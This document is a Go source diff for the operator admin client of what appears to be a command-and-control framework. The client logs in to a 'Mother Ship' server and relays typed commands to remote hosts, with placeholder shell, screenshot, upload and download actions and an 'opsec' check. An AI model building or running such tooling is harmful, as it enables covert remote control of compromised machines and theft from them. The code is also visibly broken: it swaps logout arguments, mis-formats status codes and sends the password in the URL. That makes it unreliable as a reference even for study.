@@ -3,17 +3,15 @@ package cmd
 import (
   "os"
   "fmt"
-  "net"
   "bytes"
   "bufio"
-  "errors"
+  "strings"
   "net/http"
+  "io/ioutil"
   "crypto/tls"
-  "odin/lib/c2"
-  "encoding/gob"
-  "odin/lib/core"
   "odin/lib/utils"
   "github.com/spf13/cobra"
+	"odin/wheagle/server/grpcapi"
 )
 
 
@@ -24,7 +22,7 @@ var cmdAdminCli = &cobra.Command {
     var err error
     id,err := cmd.Flags().GetString("id")
     if err != nil {
-      utils.Logerror(fmt.Errorf("Honey-badger id can not be nill"));return
+      utils.Logerror(fmt.Errorf("Mother Ship id can not be nill: %s",err));return
     }
     pass,err := cmd.Flags().GetString("pass")
     if err != nil {
@@ -33,19 +31,16 @@ var cmdAdminCli = &cobra.Command {
     var (
       url string
       client *http.Client
-      requestBody bytes.Buffer
-      encoder *gob.Encoder
-      decoder *gob.Decoder
-      work *core.Work
+      work *grpcapi.C2Command
     )
-    work = new(core.Work)
+    work = new(grpcapi.C2Command)
     /// @TODO initialize connection (tcp or tls)
-    con,err := c2.GetConn(id)
+    cnct,err := Conns.GetConn(id)
     if err != nil{
       utils.Logerror(err);return
     }
     client = new(http.Client)
-    if con.Tls {
+    if cnct.Tls {
       client = &http.Client{
   			Transport: &http.Transport{
   				TLSClientConfig: &tls.Config{
@@ -53,22 +48,14 @@ var cmdAdminCli = &cobra.Command {
   				},
   			},
   		}
-      url = fmt.Sprintf("https://%s",con.OAddress)
+      url = fmt.Sprintf("https://%s",cnct.OAddress)
     } else {
       client = &http.Client{}
-      url = fmt.Sprintf("http://%s",con.Address)
+      url = fmt.Sprintf("http://%s",cnct.OAddress)
     }
-    work.UserId = pass
-    work.OperatorId = id
-    work.ForMS = true
-    go func(){
-      encoder = gob.NewEncoder(&requestBody)
-      decoder = gob.NewDecoder(&requestBody)
-    }()
-    if err = encoder.Encode(work);err != nil{
-      utils.Logerror(fmt.Errorf("Error encoding registration.\nERROR: %q",err));return
-    }
-    req,err := http.NewRequest("PUT",url,&requestBody)
+    // register
+    regUrl := fmt.Sprintf("%s/adminauth/?pass=%s",url,pass)
+    req,err := http.NewRequest("GET",regUrl,nil)
     if err != nil{
       utils.Logerror(err);return
     }
@@ -76,31 +63,117 @@ var cmdAdminCli = &cobra.Command {
     if err != nil{
       utils.Logerror(err);return
     }
-    //utils.ClientAddHeaderVal(req,"Register","")
-    utils.Interactor(id,false)
-		fmt.Println("")
+    if resp.StatusCode != http.StatusOK {
+  		utils.Notice(fmt.Sprintf("Server returned non-OK status code: %s", resp.StatusCode))
+      body,err := ioutil.ReadAll(resp.Body)
+      if err != nil {
+        utils.Logerror(err);return
+      }
+      utils.Notice(string(body))
+  		return
+  	}
+    cookie := resp.Header.Get("Coockie")
+    resp.Body.Close()
+    utils.Interactor(id,true)
     var iarg string
 		reader := bufio.NewReader(os.Stdin)
-	  for {
+    for {
       START:
-      switch iarg {
+      fmt.Printf("[ADMIN-INTERACTOR]: ")
+			if iarg,err = reader.ReadString('\n'); err != nil{
+				utils.Logerror(err)
+				continue
+			}
+			iarg = strings.TrimSpace(iarg)
+			if iarg == "" {goto START}
+			ags := strings.Fields(iarg)
+      switch ags[0]{
         case "shell":
-          conn,err := net.Dial("tcp",address)
-          if err != nil {
-            utils.Logerror(err)
-          }
+          if err = GoodOpsec(); err != nil {
+  					utils.Warning(fmt.Sprintf("%s",err))
+  					goto END
+  				}
+        case "screenshot":
+        case "upload":
+        case "download":
+        case "back":
+          goto END
         default:
-          goto START
-        }
-      END:
+          work.In = iarg
+          work,err = SendOutput(cookie,url,work)
+          if err != nil {
+            utils.Logerror(err);return
+          }
+          fmt.Println(work.Out)
+      }
     }
+    END:
+      // close the connection
+      if err := CloseConn(cookie,url); err != nil {
+        utils.Logerror(err);return
+      }
+      utils.PrintInformation("Successfully logged out.")
+      return
   },
 }
 
-var AdminErrorChecker = func(res http.Response)error{
-  val := res.Header.Get("ERROR")
-  if len(val) > 0 {
-    return errors.New(val)
+var SendOutput = func(cookie, outUrl string, cmd *grpcapi.C2Command) (*grpcapi.C2Command,error) {
+	data, err := grpcapi.OPWorkEncode(cmd)
+	if err != nil {
+		return nil,err
+	}
+	var count int
+  BEGIN:
+	req, err := http.NewRequest("POST", outUrl, bytes.NewReader(data))
+	if err != nil {
+    return nil,fmt.Errorf("Failed to create POST request: %s", err)
+	}
+	// Set the cookie in the request header
+	req.Header.Set("Cookie", cookie)
+	resp, err := http.DefaultClient.Do(req)
+	if err != nil {
+    return nil,fmt.Errorf("Failed to make POST request: %s", err)
+	}
+	defer resp.Body.Close()
+	if resp.StatusCode != http.StatusOK {
+		if count >= 3 {
+      body,err := ioutil.ReadAll(resp.Body)
+      if err != nil {
+        return nil,fmt.Errorf("Error reading response body.: %q",err)
+      }
+      return nil,fmt.Errorf("Error sending output: %s with statuscode %s",string(body),resp.StatusCode)
+		}
+		count++
+		goto BEGIN
+	}
+  body,err := ioutil.ReadAll(resp.Body)
+  if err != nil {
+    return nil,fmt.Errorf("Error reading body: %q",err)
+  }
+  work,err := grpcapi.OPWorkDecode(body)
+  if err != nil {
+    return nil,err
+  }
+	return work,nil
+}
+
+var CloseConn = func(url,cookie string) error {
+  logoutUrl := fmt.Sprintf("%s/logout/?val=%s",url,"admin")
+  req,err := http.NewRequest("GET",logoutUrl,nil)
+  if err != nil {
+    return err
+  }
+  req.Header.Set("Cookie", cookie)
+  resp,err := http.DefaultClient.Do(req)
+  if err != nil {
+    return err
+  }
+  if resp.StatusCode != http.StatusOK {
+    body,err := ioutil.ReadAll(resp.Body)
+    if err != nil {
+      return fmt.Errorf("Error reading body: %q",err)
+    }
+    return fmt.Errorf("Error loging out: %s",string(body))
   }
   return nil
 }
